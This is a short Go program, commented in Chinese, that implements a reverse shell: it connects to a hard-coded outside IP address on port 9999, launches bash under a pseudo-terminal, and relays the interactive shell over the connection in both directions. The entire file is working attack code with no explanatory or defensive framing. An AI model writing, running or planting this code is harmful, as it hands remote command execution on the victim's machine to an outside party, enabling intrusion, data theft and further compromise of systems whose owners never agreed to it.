package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"syscall"

	"github.com/creack/pty"
)

func main() {
	conn, err := net.Dial("tcp", "45.89.233.225:9999")
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Connected to admin.")
	cmd := exec.Command("script", "-q", "-c", "bash", "/dev/null")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true,
		Ctty:    0,
	}

	// ✅ 正确启动控制终端
	ptmx, err := pty.Start(cmd)
	if err != nil {
		panic(err)
	}
	defer func() {
		_ = ptmx.Close()
		_ = cmd.Process.Signal(syscall.SIGKILL)
	}()

	// ✅ 双向复制数据
	go io.Copy(ptmx, conn)
	_, _ = io.Copy(conn, ptmx)
}
